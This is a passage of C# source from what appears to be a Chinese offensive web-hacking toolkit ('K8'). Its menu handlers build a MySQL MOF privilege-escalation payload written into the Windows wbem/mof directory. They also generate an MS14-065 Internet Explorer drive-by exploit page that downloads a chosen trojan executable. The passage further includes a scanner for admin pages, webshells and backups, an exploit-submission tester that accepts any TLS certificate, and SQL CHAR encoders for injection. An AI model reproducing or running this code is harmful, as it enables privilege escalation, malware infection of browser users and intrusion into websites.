            if (panel.Name == "K8skinMin_Normal")
            {
                (base.Controls.Find("K8skinMin_Move", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinMin_Move", true)[0] as Panel).Visible = true;
            }
        }

        private void Min_MouseUp(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinMin_Move")
            {
                base.WindowState = FormWindowState.Minimized;
                (base.Controls.Find("K8skinMin_Down", true)[0] as Panel).Visible = false;
            }
        }

        private void mOF提权CHRToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string k8startStr = "Select CHAR(";
            string k8endStr = ") into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';";
            Thread thread = new Thread(() => this.K8readFile2chr("MOF File|*.mof", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void mOF提权HexToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string k8startStr = "select CHAR(";
            string k8endStr = ") into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';";
            Thread thread = new Thread(() => this.K8readFile2Hex("MOF File|*.mof", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void mS14065ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string newValue = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("IE神洞  MS14-065  CVE-2014-6332，贯穿 Win95+IE3 – Win10+IE11 全版本\r\n");
                builder.Append("且能过掉包括DEP,ASLR,CFI等现存所有安全防护措施，影响巨大\r\n");
                builder.Append("\r\n");
                builder.Append("http://support.microsoft.com/kb/3003057\r\n");
                builder.Append("\r\n");
                builder.Append("http://hi.baidu.com/yuange1975/item/c846a94d76fe00a861d7b900\r\n");
                builder.Append("\r\n");
                builder.Append("MS14-065 EXP存放于0day-Exp目录! 此版本仅供测试研究。\r\n");
                builder.Append("\r\n");
                builder.Append("此洞必须远程地址 直接用浏览器打开本地文件 会提示拦截\r\n");
                builder.Append("\r\n");
                builder.Append("测试方法 运行K8迷你ASP服务器 无需IIS或APACHE等环境搭建\r\n");
                builder.Append("\r\n");
                builder.Append("把 生成的网马 放到程序根目录  内网虚拟机 即可测试\r\n");
                string text = this.txt_ms14065.Text.Replace("http://qqhack8.blog.163.com/xxoo.exe", newValue);
                string path = @"0day-Exp\ms14065exp.htm";
                if (System.IO.File.Exists(path))
                {
                    System.IO.File.Delete(path);
                }
                this.TxtWriteLog(text, path, 3);
                string str4 = builder.ToString() + "\r\n\r\n网马文件: " + path + "  HTTP木马地址: " + newValue;
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str4 + "\r\n\r\n" + this.k8encodeSplit);
                this.K8msgbox("生成成功! MS14-065 EXP存放于0day-Exp目录!");
            }
            else
            {
                this.K8msgbox("请先填写马的下载地址,然后右键选中再点此按钮生成EXP.");
            }
        }

        private void mSSQLCHARDecodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8SQL_CHAR_Decode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void mSSQLCHARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.MSSQL_ChrCode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void mysqlCHAR1DecodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8SQL_CHAR_Decode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void mysqlCHAR2DecodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8SQL_CHAR_Decode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void mYSQLCHAR2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.MYSQL_ChrCode2(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void mYSQLCHARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.MYSQL_ChrCode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_WebShell_Click(null, null);
        }

        private void OpenScanAdminURL(string IEname)
        {
            if (this.LV_ScanAdmin.SelectedIndices.Count > 0)
            {
                string arguments = Convert.ToString(this.LV_ScanAdmin.Items[this.LV_ScanAdmin.SelectedIndices[0]].SubItems[1].Text);
                try
                {
                    Process.Start(IEname, arguments);
                }
                catch (Exception exception)
                {
                    this.K8msgbox(IEname + " " + exception.Message);
                }
                int index = this.LV_ScanAdmin.Items.IndexOf(this.LV_ScanAdmin.FocusedItem);
                this.LV_ScanAdmin.Items[index].SubItems[0].ForeColor = Color.Blue;
            }
        }

        private void OpenURL(string IEname, string URL)
        {
            try
            {
                Process.Start(IEname, URL);
            }
            catch (Exception exception)
            {
                this.K8msgbox(IEname + " " + exception.Message);
            }
        }

        private void oracleCHRDecodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8SQL_CHAR_Decode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void oracleCHRToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Oracle_ChrCode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void perlPost提交代码post参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Perl Post提交代码)：\r\n\r\n");
                builder.Append("use LWP::UserAgent;\r\n");
                builder.Append("my $ua = LWP::UserAgent->new;\r\n");
                builder.Append("my $req = HTTP::Request->new('POST' => 'http://qqhack8.blog.163.com/post.php');\r\n");
                builder.Append("$req->content_type('application/x-www-form-urlencoded');\r\n");
                builder.Append("$req->header('Cookie' => \"key1=value1;key2=value2\");\r\n");
                builder.Append("$req->header('Accept-Language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3');  \r\n");
                builder.Append("$req->content(\"" + str + "\");\r\n");
                builder.Append("my $res = $ua->request($req);\r\n");
                builder.Append("print $res->status_line.\"\n\";\r\n");
                builder.Append("print $res->as_string();\r\n");
                builder.Append("       #$res->content();\r\n");
                string str2 = "\r\n原文：\t" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void pHPCHR字符串ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.PHP_ChrCode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void pHPCHR字符串反转ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8SQL_CHAR_Decode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void pHPPost参数Post参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Post参数)：\r\n\r\n");
                builder.Append(K8crack.PHPPostDecode(str));
                string str2 = "\r\n原文：\t\r\n" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void pHPPost提交代码post参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(PHP Post提交代码)：\r\n\r\n");
                builder.Append("<?php\r\n");
                builder.Append("$URL='http://qqhack8.blog.163.com/post.php';\r\n");
                builder.Append(K8crack.PHPPostDecode(str));
                builder.Append("\r\n");
                builder.Append("$referrer=\"\";\r\n");
                builder.Append("// parsing the given URL\r\n");
                builder.Append("$URL_Info=parse_url($URL);\r\n");
                builder.Append("// Building referrer\r\n");
                builder.Append("if($referrer==\"\") // if not given use this script as referrer\r\n");
                builder.Append("$referrer=$_SERVER[\"SCRIPT_URI\"];\r\n");
                builder.Append(" \r\n");
                builder.Append("// making string from $data\r\n");
                builder.Append("foreach($post_data as $key=>$value)\r\n");
                builder.Append("$values[]=\"$key=\".urlencode($value);\r\n");
                builder.Append(" \r\n");
                builder.Append("$data_string=implode(\"&\",$values);\r\n");
                builder.Append("// Find out which port is needed - if not given use standard (=80)\r\n");
                builder.Append("if(!isset($URL_Info[\"port\"]))\r\n");
                builder.Append("$URL_Info[\"port\"]=80;\r\n");
                builder.Append("// building POST-request:\r\n");
                builder.Append("//$request.=\"POST \".$URL_Info[\"path\"].\" HTTP/1.1\n\";\r\n");
                builder.Append("$request.=\"POST \".$URL.\" HTTP/1.1\n\";\r\n");
                builder.Append("$request.=\"Host: \".$URL_Info[\"host\"].\"\n\";\r\n");
                builder.Append("$request.=\"Referer: $referrer\n\";\r\n");
                builder.Append("$request.=\"Content-type: application/x-www-form-urlencoded\n\";\r\n");
                builder.Append("$request.=\"Content-length: \".strlen($data_string).\"\n\";\r\n");
                builder.Append("$request.=\"Connection: close\n\";\r\n");
                builder.Append("$request.=\"\n\";\r\n");
                builder.Append("$request.=$data_string.\"\n\";\r\n");
                builder.Append("$fp = fsockopen($URL_Info[\"host\"],$URL_Info[\"port\"]);\r\n");
                builder.Append("fputs($fp, $request);\r\n");
                builder.Append("while(!feof($fp)) {\r\n");
                builder.Append("    $result .= fgets($fp, 128);\r\n");
                builder.Append("}\r\n");
                builder.Append("fclose($fp);\r\n");
                builder.Append("?>\r\n");
                string str2 = "\r\n原文：\t" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_ExploitManage");
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {
            this.tab_MainForm.SelectTab("tab_Introduction");
        }

        public void PostSubmit()
        {
            string requestUriString = this.txt_k8url.Text.Trim();
            if (requestUriString == "")
            {
                this.Btn_Submit.Enabled = true;
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                if (!requestUriString.Contains("http://") & !requestUriString.Contains("https://"))
                {
                    requestUriString = "http://" + requestUriString;
                    this.txt_k8url.Text = requestUriString;
                }
                requestUriString = requestUriString + this.txt_addURL.Text.Trim();
                if (requestUriString.Contains("https://"))
                {
                    ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(this.RemoteCertificateValidationCallback);
                    new X509Store(StoreName.My, StoreLocation.CurrentUser).Open(OpenFlags.OpenExistingOnly);
                }
                StringBuilder builder = new StringBuilder();
                try
                {
                    HttpWebResponse response;
                    HttpWebRequest request = null;
                    try
                    {
                        request = (HttpWebRequest) WebRequest.Create(requestUriString);
                    }
                    catch (Exception exception1)
                    {
                        Exception exception = exception1;
                        this.K8msgbox(exception.Message);
                        return;
                    }
                    request.Accept = "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*";
                    if (this.txt_RefererURL.Text.Trim() != "")
                    {
                        request.Referer = this.txt_RefererURL.Text.Trim();
                    }
                    if (this.chk_allowRedirect.Checked)
                    {
                        request.AllowAutoRedirect = true;
                    }
                    else
                    {
                        request.AllowAutoRedirect = false;
                    }
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.UserAgent = this.txt_UserAgent.Text;
                    request.KeepAlive = true;
                    request.Timeout = int.Parse(this.txt_TimeOut.Text);
                    if (this.chk_submitCookies.Checked)
                    {
                        string str2 = this.txt_submitCookies.Text.Trim();
                        if (str2 == "")
                        {
                            this.K8msgbox("啊...！你还没填Cookies!");
                            return;
                        }
                        CookieContainer cookieContainer = new CookieContainer();
                        string[] strArray = str2.Split(";".ToCharArray());
                        foreach (string str3 in strArray)
                        {
                            cookieContainer.SetCookies(new Uri(requestUriString), str3);
                        }
                        if (cookieContainer.Count != 0)
                        {
                            request.CookieContainer = cookieContainer;
                        }
                        else
                        {
                            request.CookieContainer = new CookieContainer();
                            cookieContainer = request.CookieContainer;
                        }
                    }
                    request.ProtocolVersion = HttpVersion.Version10;
                    request.Method = "POST";
                    string s = "";
                    s = this.txt_SubmitData.Text.Trim();
                    byte[] bytes = new ASCIIEncoding().GetBytes(s);
                    request.ContentLength = bytes.Length;
                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    try
                    {
                        response = (HttpWebResponse) request.GetResponse();
                    }
                    catch (WebException exception2)
                    {
                        response = (HttpWebResponse) exception2.Response;
                        this.K8msgbox(Convert.ToString((int) response.StatusCode));
                    }
                    StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(this.K8webBrowserEncoding(this.cbb_DataOutEncoding.Text)));
                    string str5 = "";
                    string str6 = "";
                    while ((str5 = reader.ReadLine()) != null)
                    {
                        str6 = str6 + str5 + "\r\n";
                    }
                    this.txt_Result.AppendText(builder.ToString() + str6.Trim());
                    reader.Close();
                }
                catch (Exception exception4)
                {
                    this.txt_Result.AppendText(exception4.ToString());
                }
                this.Btn_Submit.Enabled = true;
            }
        }

        private void post参数FlashPost参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Flash Post参数)：\r\n\r\n");
                builder.Append(K8crack.FlashPostEncode(str));
                string str2 = "\r\n原文：\t\r\n" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void post参数JQueryPost参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "";
                str2 = "密文(常规 Post参数)：\r\n\r\n" + K8crack.jqueryPostDecode(str) + "\r\n\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "\r\n\r\n" + str2 + this.k8encodeSplit);
            }
        }

        private void post参数PHPPost参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(PHP Post参数)：\r\n\r\n");
                builder.Append(K8crack.PHPPostEncode(str) + "\r\n");
                string str2 = "\r\n原文：\t\r\n" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void post参数PythonPost参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Python Post参数)：\r\n\r\n");
                builder.Append(K8crack.PythonPostEncode(str));
                string str2 = "\r\n原文：\t\r\n" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void pythonPost参数Post参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Post参数)：\r\n\r\n");
                builder.Append(K8crack.PythonPostDecode(str));
                string str2 = "\r\n原文：\t\r\n" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void pythonPost提交代码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Python Post提交代码)：\r\n\r\n");
                builder.Append("import urllib\r\n");
                builder.Append("import urllib2\r\n");
                builder.Append("url = 'http://qqhack8.blog.163.com/post.php'\r\n");
                builder.Append("\r\n");
                builder.Append("values = " + K8crack.PythonPostEncode(str) + "\r\n");
                builder.Append("data = urllib.urlencode(values)\r\n");
                builder.Append("print data\r\n");
                builder.Append("req = urllib2.Request(url, data)\r\n");
                builder.Append("response = urllib2.urlopen(req)\r\n");
                builder.Append("the_page = response.read()\r\n");
                builder.Append("print the_page\r\n");
                string str2 = "\r\n原文：\t" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void rb_GetMethod_CheckedChanged(object sender, EventArgs e)
        {
            this.Btn_Submit.Enabled = true;
        }

        private void rb_none_CheckedChanged(object sender, EventArgs e)
        {
            this.Btn_Submit.Enabled = true;
        }

        private void rb_PostMethod_CheckedChanged(object sender, EventArgs e)
        {
            this.Btn_Submit.Enabled = true;
        }

        public bool RemoteCertificateValidationCallback(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        private void ScanAdminListViewsSet()
        {
            this.intScanAdminSpace = 1;
            this.LV_ScanAdmin.GridLines = true;
            this.LV_ScanAdmin.View = View.Details;
            this.LV_ScanAdmin.Columns.Add("ID", 0x41, HorizontalAlignment.Left);
            this.LV_ScanAdmin.Columns.Add("网站后台目录(Shell地址/敏感信息文件等)", 570);
            this.LV_ScanAdmin.Columns[1].TextAlign = HorizontalAlignment.Left;
        }

        public static string[] ScanRobots(string k8url)
        {
            string[] strArray = new string[0];
            string[] strArray2 = new string[0];
            if (K8scanAdmin(k8url, "robots.txt", 0x2710))
            {
                string hTML = K8WebOperation.GetHTML(k8url + "robots.txt");
                if (hTML.Contains("\r\n"))
                {
                    return hTML.Replace("\r\n", "◎").Trim().Split(new char[] { '◎' });
                }
                if (hTML.Contains("\n"))
                {
                    return hTML.Replace("\n", "◎").Trim().Split(new char[] { '◎' });
                }
            }
            return strArray;
        }

        public static string Search_string(string s, string s1, string s2)
        {
            try
            {
                int startIndex = s.IndexOf(s1, 0) + s1.Length;
                int index = s.IndexOf(s2, startIndex);
                return s.Substring(startIndex, index - startIndex);
            }
            catch (Exception)
            {
                return "";
            }
        }

        private string SelectAdminDic(string TxtPath)
        {
            if (this.rb_ALL.Checked)
            {
                this.rb_ALL.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\all.K8";
            }
            if (this.rb_4P.Checked)
            {
                this.rb_4P.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\4p.K8";
            }
            if (this.rb_ASP.Checked)
            {
                this.rb_ASP.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\asp.K8";
            }
            if (this.rb_JSP.Checked)
            {
                this.rb_JSP.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\jsp.K8";
            }
            if (this.rb_PHP.Checked)
            {
                this.rb_PHP.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\php.K8";
            }
            if (this.rb_ASPX.Checked)
            {
                this.rb_ASPX.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\aspx.K8";
            }
            if (this.rb_backup.Checked)
            {
                this.rb_backup.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\backup.K8";
            }
            if (this.rb_CGI.Checked)
            {
                this.rb_CGI.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\cgi.K8";
            }
            if (this.rb_DataBase.Checked)
            {
                this.rb_DataBase.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\DataBase.K8";
            }
            if (this.rb_dir.Checked)
            {
                this.rb_dir.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\dir.K8";
            }
            if (this.rb_Shell.Checked)
            {
                this.rb_Shell.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\Shell.K8";
            }
            if (this.rb_UPfile.Checked)
            {
                this.rb_UPfile.Enabled = true;
                TxtPath = Application.StartupPath + @"\K8dic\ScanAdmin\upfile.K8";
            }
            return TxtPath;
        }

        private void sendToSubmitTestToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ToolStripDropDownItem item = sender as ToolStripDropDownItem;
            ContextMenuStrip currentParent = item.GetCurrentParent() as ContextMenuStrip;
            string id = currentParent.SourceControl.Name.Split(new char[] { '_' })[1];
            string str2 = "";
            string str = "";
            string str4 = "";
            string str5 = "";
            string str6 = "";
            string str7 = "";
            string str8 = "";
            string str9 = "";
            DataSet idDataSet = BLLk8EXP.GetIdDataSet(id);
            foreach (DataRow row in idDataSet.Tables[0].Rows)
            {
                this.k8appName = row["appName"].ToString();
                this.k8btnName = row["btnName"].ToString();
                this.k8btnTip = row["btnTip"].ToString();
                str2 = row["method"].ToString();
                str = row["cookie"].ToString();
                str4 = row["sumbitData"].ToString();
                str5 = row["referer"].ToString();
                str6 = row["userAgent"].ToString();
                str7 = row["encode"].ToString();
                str8 = row["allowRedirect"].ToString();
                str9 = row["addURL"].ToString();
                this.k8btnName = K8crack.K8expBase64(this.k8btnName, 0);
                this.k8btnTip = K8crack.K8expBase64(this.k8btnTip, 0);
                str = K8crack.K8expBase64(str, 0);
                str4 = K8crack.K8expBase64(str4, 0);
                str5 = K8crack.K8expBase64(str5, 0);
                str6 = K8crack.K8expBase64(str6, 0);
                str9 = K8crack.K8expBase64(str9, 0);
                this.txt_k8url.Text = this.txt_ExpURL.Text;
                this.txt_addURL.Text = str9;
                if (str2 == "POST")
                {
                    this.rb_PostMethod.Checked = true;
                }
                else if (str2 == "GET")
                {
                    this.rb_GetMethod.Checked = true;
                }
                else
                {
                    this.rb_none.Checked = true;
                }
                this.txt_RefererURL.Text = str5;
                if (str != "")
                {
                    this.chk_submitCookies.Checked = true;
                }
                else
                {
                    this.chk_submitCookies.Checked = false;
                }
                this.txt_submitCookies.Text = str;
                this.txt_SubmitData.Text = str4;
                this.txt_UserAgent.Text = str6;
                switch (str7)
                {
                    case "65001":
                        this.cbb_expDebugCoding.Text = "UTF-8";
                        break;

                    case "936":
                        this.cbb_expDebugCoding.Text = "GB2312";
                        break;
                }
                if (str8 == "true")
                {
                    this.chk_allowRedirect.Checked = true;
                }
                else if (str8 == "false")
                {
                    this.chk_allowRedirect.Checked = false;
                }
            }
            this.tab_MainForm.SelectedTab = this.tab_MainForm.TabPages["tab_SubmitTest"];
        }

        private void setTagToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ToolStripDropDownItem item = sender as ToolStripDropDownItem;
            ContextMenuStrip currentParent = item.GetCurrentParent() as ContextMenuStrip;
            Control sourceControl = currentParent.SourceControl;
            if (sourceControl.BackColor == Color.LightSteelBlue)
            {
                sourceControl.BackColor = Control.DefaultBackColor;
            }
            else
            {
                sourceControl.BackColor = Color.LightSteelBlue;
            }
        }

        private void sHA1加密40位ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.SHA1_Encrypt(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void sHA256加密ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.SHA256Encrypt(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void sHA384加密ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.SHA384Encrypt(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void sHA512加密ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.SHA512Encrypt(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        public static byte[] Str2Arr(string s)
        {
            return new UnicodeEncoding().GetBytes(s);
        }

        private void string2AsciiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8Ascii_encode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void tab_MainForm_Selected(object sender, TabControlEventArgs e)
        {
        }

        public static string ToHexString(byte[] bytes)
        {
            string str = string.Empty;
            if (bytes == null)
            {
                return str;
            }
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < bytes.Length; i++)
            {
                builder.Append(bytes[i].ToString("X2"));
            }
            return builder.ToString();
        }

        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("\\\"", "\""));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("\"", "\\\""));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(":=", "="));
                this.txt_EncodeDecodeText.Paste();
            }
        }

